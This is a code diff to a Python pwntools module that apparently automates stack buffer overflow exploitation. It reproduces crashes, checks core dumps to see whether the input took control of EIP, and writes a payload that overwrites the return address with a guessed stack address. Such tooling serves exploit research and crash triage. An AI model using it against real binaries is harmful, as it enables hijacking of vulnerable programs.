@@ -1,9 +1,6 @@
-from pwn import *
-from utils import build_command, interactive_gdb
-from exploit_utils import build_exploit_command
-from dataclass_utils import Target, TargetInput
-from exploit_utils import ENV_VARS
-import glob
+from .utils import *
+from .dataclass_utils import Target
+from .exploit_utils import ENV_VARS
 
 
 def reproducer(target: Target) -> bool:
@@ -34,7 +31,6 @@ def reproducer(target: Target) -> bool:
 
     command = build_command(target)
 
-
     rep_proc = process(
         command, 
         shell=True,
@@ -42,11 +38,16 @@ def reproducer(target: Target) -> bool:
         stdout=PTY, 
         stderr=PTY, 
         raw=False, 
-        env={**os.environ, **ENV_VARS}
+        env={**target.env, **ENV_VARS}
     )
 
+    # rep_proc.send(b"\x04")
+    # rep_proc.stdin.close()
+
     while rep_proc.poll() is None:
+        # rep_proc.sendline()     #sendline as many times as needed because of the hyphen in the command. It asks input from stdin, runs in the inside of the pty so it might just hang if we dont send newlines
         rep_proc.wait(timeout=1)
+
 
     poll = rep_proc.poll()
     if poll == -11 or poll == 139:  #segfault
@@ -95,15 +96,19 @@ def root_cause_analysis(target: Target, crash_input: bytes) -> bool:
     crash_proc = process(
         command, 
         shell=True,
-        stdin=PTY, 
+        stdin=PTY,
         stdout=PTY, 
-        stderr=PTY, 
-        raw=False, 
-        env={**os.environ, **ENV_VARS}
+        stderr=PTY,
+        raw=False,
+        env={**target.env, **ENV_VARS}
     )
 
+    # crash_proc.send(b"\x04")
+    # crash_proc.stdin.close()
+
     while crash_proc.poll() is None:
-        crash_proc.wait(timeout=1)
+        # crash_proc.sendline()
+        crash_proc.wait(timeout=0.5)
 
     poll = crash_proc.poll()
     if poll != -11 and poll != 139:       # if not segfault
@@ -125,9 +130,9 @@ def root_cause_analysis(target: Target, crash_input: bytes) -> bool:
     core = Corefile(core_path)
     eip = core.eip.to_bytes(4, byteorder="little")
 
+
     # if the value of the eip belongs to the crash input, it means it was overwritten by the crash input and the payload reached the return address
-    if eip in crash_input:
-        # interactive_gdb(target_bin, core_path, ENV_VARS)
+    if eip in crash_input and not valid_stack_addr(core.eip, core.stack.start, core.stack.stop):
         return True
 
     # eip still has a valid value, so it wasn't overwritten by the payload. The program prematurely crashed and it did not reach the return address
@@ -149,7 +154,9 @@ def payload_builder(target: Target) -> None:
     target_address = target_ra(target.name)
 
     payload = overwrite_ra(
-        target.target_input.content, target.name, struct.pack("<I", target_address)
+        target.target_input.content, 
+        target.name, 
+        struct.pack("<I", target_address)
     )
 
     open("payload", "wb").write(payload)
@@ -205,7 +212,8 @@ def target_ra(target_bin: str) -> int:
 
     middle = (core.stack.start + core.stack.stop) // 2
     # middle = (core.envp_address + core.stack.stop) // 2
-    middle += 4
+    #172 == \xac
+    middle += 172
 
     return middle
 
@@ -234,15 +242,19 @@ def verify_eip_control(target: Target):
         stdout=PTY, 
         stderr=PTY, 
         raw=False, 
-        env={**os.environ, **ENV_VARS}
+        env={**target.env, **ENV_VARS}
     )
+  
+    # rep_proc.send(b"\x04")
+    # rep_proc.stdin.close()
 
     while rep_proc.poll() is None:
-        rep_proc.wait(timeout=1)
+        # rep_proc.sendline()
+        rep_proc.wait(timeout=0.5)
 
     poll = rep_proc.poll()
     if poll != -11 and poll != 139:       # if not segfault
-        logging.error('The crashing input failed to cause a crash.')
+        pivot_logger.error('The crashing input failed to cause a crash.')
         sys.exit(1)
 
     int_process = rep_proc.pid + 2
@@ -250,7 +262,7 @@ def verify_eip_control(target: Target):
     core_path = f'/core_dumps/core.{target.name}.{int_process}'
 
     if core_path not in core_files:
-        logging.error(
+        pivot_logger.error(
             "In EIP control verifier, the crashing program did not generate a core dump."
         )
         sys.exit(1)
@@ -258,7 +270,10 @@ def verify_eip_control(target: Target):
     core = Corefile(core_path)
     eip = core.eip.to_bytes(4, byteorder="little")
     if eip not in crash_input:
-        logging.error("The crashing input failed to take control of EIP.")
+        pivot_logger.error("The crashing input failed to take control of EIP.")
         sys.exit(1)
+
+    if b'\x00' in crash_input:
+        pivot_logger.error('MUTATION CONTAINS NULL BYTES')
 
     return
